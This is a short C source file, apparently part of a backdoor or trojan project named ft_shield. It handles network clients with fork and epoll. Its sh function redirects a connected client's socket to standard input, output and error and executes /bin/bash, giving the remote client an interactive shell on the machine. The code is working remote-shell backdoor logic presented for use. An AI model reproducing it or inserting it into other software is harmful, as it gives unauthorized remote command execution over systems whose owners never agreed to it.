#include "ft_shield.h"

void disconnect_shell(int fd, Client *clients, int epollfd, struct epoll_event *ev) {
	int disconnected_fd;
	read(fd, &disconnected_fd, sizeof(int));
	Client *client = get_client(clients, disconnected_fd);
	if (client)
		disconnect_client(client, epollfd, ev);
}

void sh(Client *client, int pipefd) {
	if (!fork()) {
		int pid_child = fork();
		if (!pid_child) {
			dup2(client->fd, 0);
			dup2(client->fd, 1);
			dup2(client->fd, 2);

			execve("/bin/bash", (char*[]){"/bin/sh", NULL}, NULL);
		} else {
			waitpid(pid_child, NULL, 0);
			write(pipefd, &client->fd, sizeof(int));
		}
		exit(0);
	}
}

